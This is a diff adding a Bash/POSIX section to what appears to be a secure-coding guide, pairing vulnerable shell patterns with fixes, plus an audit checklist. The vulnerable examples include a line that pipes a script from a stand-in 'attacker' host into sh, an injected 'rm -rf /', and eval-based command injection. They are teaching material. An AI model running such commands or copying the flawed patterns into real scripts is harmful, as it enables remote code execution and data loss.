@@ -476,6 +476,192 @@ Pair with InjectionHunter (`Install-Module InjectionHunter`) for additional inje
 
 ---
 
+## Bash / POSIX shell
+
+The Linux equivalent of PowerShell: tiny scripts (`.sh`, `.bash`) glued into installers, CI jobs, cron, Docker `RUN` lines, and `entrypoint.sh`. Almost never reviewed, almost always quoted wrong. `shellcheck` catches most of these but only if you actually run it in CI.
+
+### Command Injection / Word Splitting (CWE-78, CWE-77)
+```bash
+# ❌ Vulnerable - unquoted variable goes through word splitting and globbing
+ping $userInput                       # `; rm -rf /` becomes its own command
+eval "ping $userInput"                # eval = always wrong on user input
+sh -c "ping $userInput"
+bash -c "tar -xf $file"
+
+# ❌ Even quoted, eval is dangerous
+eval "echo \"$userInput\""            # backticks/$() in $userInput still execute
+
+# ✅ Safe: quote, and never eval. Use arrays for argv.
+ping -- "$validatedHost"
+cmd=(tar -xf "$file")
+"${cmd[@]}"
+```
+
+### Unquoted Expansion (CWE-78)
+```bash
+# ❌ Vulnerable - the canonical "rm -rf bug"
+rm -rf $TMPDIR/*                      # if TMPDIR is empty → rm -rf /*
+cp $src $dst                          # spaces in paths break this
+for f in $files; do ...               # word-split + glob expansion
+
+# ✅ Safe
+rm -rf -- "${TMPDIR:?TMPDIR must be set}"/*    # :? aborts if unset/empty
+cp -- "$src" "$dst"
+for f in "${files[@]}"; do ...                  # array, not string
+```
+
+### Missing `set -euo pipefail` (CWE-754)
+```bash
+#!/usr/bin/env bash
+# ❌ Vulnerable - failures are silently ignored, downstream commands run on garbage
+download_file
+process_file                          # runs even if download_file failed
+
+# ✅ Safe defaults at the top of every script
+set -Eeuo pipefail
+IFS=$'\n\t'
+trap 'echo "Error on line $LINENO" >&2' ERR
+#  -E  : ERR trap inherited by functions
+#  -e  : exit on any command failure
+#  -u  : unset variables are an error
+#  -o pipefail : a failure anywhere in a pipe fails the pipe
+```
+
+### `find -exec` and `xargs` Injection (CWE-78)
+```bash
+# ❌ Vulnerable - filenames with spaces, newlines, or `;` break parsing
+find . -name "*.log" | xargs rm
+find . -name "$pattern" -exec rm {} \;          # $pattern unquoted
+
+# ✅ Safe: NUL-delimited and explicit termination
+find . -name '*.log' -print0 | xargs -0 rm --
+find . -name '*.log' -exec rm -- {} +
+```
+
+### Insecure Download / `curl | sh` (CWE-494, CWE-829, CWE-319)
+```bash
+# ❌ Vulnerable - run remote code with no integrity check, no TLS verification
+curl http://get.example.com/install.sh | sh
+curl -sSL https://get.example.com/install.sh | bash
+wget -qO- https://attacker/x.sh | sh
+curl -k https://example.com/installer.sh | sh   # -k disables TLS verification
+
+# ❌ Worse: store-and-run with no verification
+curl -O https://example.com/installer.sh && sh installer.sh
+
+# ✅ Safe: pin a SHA-256, verify before running
+expected='e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
+curl -fsSL --proto '=https' --tlsv1.2 \
+     -o installer.sh https://example.com/installer.sh
+actual=$(sha256sum installer.sh | awk '{print $1}')
+[[ "$actual" == "$expected" ]] || { echo "hash mismatch"; exit 1; }
+sh installer.sh
+```
+
+### Path Traversal (CWE-22)
+```bash
+# ❌ Vulnerable
+cat "/uploads/$userFile"
+rm "/uploads/$userFile"
+tar -xf archive.tar -C /uploads        # archive may contain ../ entries
+
+# ✅ Safe - resolve and bound the path
+base=$(realpath /uploads)
+target=$(realpath -m -- "$base/$userFile")
+case "$target" in
+  "$base"/*) : ;;     # ok
+  *) echo "path traversal" >&2; exit 1 ;;
+esac
+cat -- "$target"
+
+# Tar: refuse absolute and parent-relative paths
+tar --no-overwrite-dir --no-same-owner -xf archive.tar -C /uploads \
+    --exclude='..*' --exclude='/*'
+```
+
+### Temp File Race (CWE-377, CWE-367)
+```bash
+# ❌ Vulnerable - predictable name, attacker pre-creates a symlink
+tmp="/tmp/myscript.$$"
+echo data > "$tmp"
+
+# ✅ Safe - mktemp creates the file atomically with mode 600
+tmp=$(mktemp) || exit 1
+trap 'rm -f -- "$tmp"' EXIT
+echo data > "$tmp"
+```
+
+### Secrets on the Command Line (CWE-214)
+```bash
+# ❌ Vulnerable - argv is visible to every user on the box via /proc, ps
+mysql -u root -p"$PASSWORD" -e "SELECT 1"
+curl -u "user:$TOKEN" https://api.example.com
+aws s3 cp s3://b/k - --metadata "secret=$TOKEN"
+
+# ✅ Safe - read from env, stdin, or a credentials file with mode 600
+MYSQL_PWD="$PASSWORD" mysql -u root -e "SELECT 1"
+curl --netrc-file ~/.netrc https://api.example.com
+# or
+curl -H @<(printf 'Authorization: Bearer %s\n' "$TOKEN") https://api.example.com
+```
+
+### `IFS` and Locale Tampering (CWE-807)
+```bash
+# ❌ Vulnerable - sourced configs can redefine IFS, PATH, LANG and break parsing
+source /etc/myapp/config.sh                    # untrusted file
+PATH="" command_that_calls_others              # PATH manipulation
+
+# ✅ Safe - reset IFS and PATH at the top, never source untrusted files
+IFS=$' \t\n'
+PATH=/usr/local/bin:/usr/bin:/bin
+unset CDPATH
+```
+
+### Shebang and Privilege Escalation
+```bash
+# ❌ Anti-patterns
+#!/bin/sh                              # not actually POSIX on every distro (Ubuntu = dash)
+sudo -E ./script.sh                    # -E preserves env including PATH, LD_PRELOAD
+chmod 777 /opt/app                     # world-writable script run by root = trivial RCE
+setuid root /usr/local/bin/myscript    # setuid on a shell script: ignored on Linux
+                                       # but still wrong - use a compiled wrapper
+
+# ✅ Safe
+#!/usr/bin/env bash                    # explicit bash if you use bashisms
+chmod 750 /opt/app/run.sh              # owner-rw, group-rx, world-nothing
+```
+
+### Auditing checklist for any `.sh` you ship
+
+- [ ] `set -Eeuo pipefail` and a sane `IFS` at the top.
+- [ ] All variable expansions are quoted: `"$var"`, `"${arr[@]}"`.
+- [ ] No `eval` on anything that touches user input or env.
+- [ ] No `curl ... | sh` pattern - download, hash-check, then execute.
+- [ ] HTTPS only, no `-k` / `--insecure`.
+- [ ] `mktemp` for temp files, `trap` to clean up on EXIT.
+- [ ] No secrets passed via argv - use env, stdin, or `~/.netrc` (mode 600).
+- [ ] `find ... -print0 | xargs -0` or `-exec ... +` instead of pipe-to-xargs.
+- [ ] Path inputs resolved and bounded under an allowed base directory.
+- [ ] No `sudo -E`, no setuid shell scripts, no world-writable script paths.
+- [ ] Sourced config files come from a trusted, mode-600 path.
+
+### Detection (shellcheck)
+
+```bash
+# Local
+shellcheck --severity=warning --shell=bash --enable=all script.sh
+
+# Recursive over a repo
+find . -type f \( -name '*.sh' -o -name '*.bash' \) -print0 \
+  | xargs -0 shellcheck --severity=warning
+
+# CI: use ludeeus/action-shellcheck (SHA-pinned in script-lint.yml)
+```
+
+Pair with `bash -n script.sh` for syntax-only checks and `shfmt -d` for formatting drift. Add both to the CI pipeline that ships any `.sh` artifact.
+
+---
+
 ## Java
 
 ### SQL Injection (CWE-89)
